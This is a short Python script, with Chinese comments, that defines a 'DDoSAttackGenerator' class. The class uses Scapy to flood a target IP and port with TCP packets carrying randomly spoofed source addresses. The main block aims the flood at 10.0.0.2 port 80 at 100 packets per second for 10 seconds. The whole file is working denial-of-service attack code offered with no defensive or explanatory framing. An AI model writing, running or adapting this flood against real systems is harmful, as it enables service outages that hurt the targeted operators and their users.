from scapy.all import *
import random

class DDoSAttackGenerator:
    def __init__(self, dst_ip, dst_port, attack_duration, packet_rate):
        self.dst_ip = dst_ip
        self.dst_port = dst_port
        self.attack_duration = attack_duration  # 攻击持续时间（秒）
        self.packet_rate = packet_rate  # 每秒发送的包数量

    def generate(self):
        start_time = time.time()
        while (time.time() - start_time) < self.attack_duration:
            for _ in range(self.packet_rate):
                packet = IP(src=RandIP(), dst=self.dst_ip) / TCP(dport=self.dst_port)
                send(packet, verbose=0)

if __name__ == '__main__':
    # DDoS攻击参数
    dst_ip = '10.0.0.2'  # 目标IP地址
    dst_port = 80  # 目标端口，例如HTTP
    attack_duration = 10  # 攻击持续10秒
    packet_rate = 100  # 每秒发送100个包

    ddos_attack = DDoSAttackGenerator(dst_ip, dst_port, attack_duration, packet_rate)
    ddos_attack.generate()